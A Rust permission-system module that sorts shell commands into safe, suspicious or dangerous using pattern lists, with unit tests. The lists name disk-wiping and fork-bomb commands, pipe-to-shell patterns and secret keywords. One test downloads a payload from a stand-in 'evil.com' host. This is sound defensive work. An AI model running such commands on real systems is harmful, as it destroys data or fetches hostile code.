/// Shell command risk classifier for permission system.
/// Detects dangerous commands based on patterns and heuristics.

/// Risk level for a shell command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellRisk {
    Safe,
    Suspicious,
    Dangerous,
}

/// Known dangerous command prefixes (absolute paths also checked).
const DANGEROUS_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -rf ~",
    "rm -rf /*",
    "mkfs",
    "dd if=",
    ":(){ :|:& };:",
    "chmod 777 /",
    "> /dev/sda",
    "> /dev/sdb",
    "> /dev/nvme",
    "mv /",
    "mv ~",
];

/// Suspicious patterns that should prompt user confirmation.
const SUSPICIOUS_PATTERNS: &[&str] = &[
    "sudo",
    "wget ",
    "curl ",
    "chmod ",
    "chown ",
    "kill ",
    "pkill ",
    "rm -rf",
    "rm -r",
    "rm -f",
    "> ",
    ">> ",
    "| sh",
    "| bash",
    "python -c",
    "bash -c",
    "eval ",
    "exec ",
    "source ",
    ".env",
    "token",
    "secret",
    "password",
    "api_key",
    "CODECODER_API_KEY",
    "OPENAI_API_KEY",
];

/// Classify a shell command into a risk level.
pub fn classify_shell_command(cmd: &str) -> ShellRisk {
    let cmd_lower = cmd.to_lowercase().trim().to_string();

    // Check dangerous patterns first
    for pattern in DANGEROUS_PATTERNS {
        if cmd_lower.contains(pattern) {
            return ShellRisk::Dangerous;
        }
    }

    // Check suspicious patterns
    for pattern in SUSPICIOUS_PATTERNS {
        if cmd_lower.contains(pattern) {
            return ShellRisk::Suspicious;
        }
    }

    ShellRisk::Safe
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_ls() {
        assert_eq!(classify_shell_command("ls -la"), ShellRisk::Safe);
    }

    #[test]
    fn test_safe_echo() {
        assert_eq!(classify_shell_command("echo hello"), ShellRisk::Safe);
    }

    #[test]
    fn test_dangerous_rm_rf() {
        assert_eq!(classify_shell_command("rm -rf /"), ShellRisk::Dangerous);
    }

    #[test]
    fn test_dangerous_mkfs() {
        assert_eq!(classify_shell_command("sudo mkfs.ext4 /dev/sda1"), ShellRisk::Dangerous);
    }

    #[test]
    fn test_suspicious_sudo() {
        assert_eq!(classify_shell_command("sudo apt update"), ShellRisk::Suspicious);
    }

    #[test]
    fn test_suspicious_wget() {
        assert_eq!(classify_shell_command("wget http://evil.com/payload.sh"), ShellRisk::Suspicious);
    }

    #[test]
    fn test_suspicious_rm() {
        assert_eq!(classify_shell_command("rm -rf temp/*"), ShellRisk::Suspicious);
    }
}
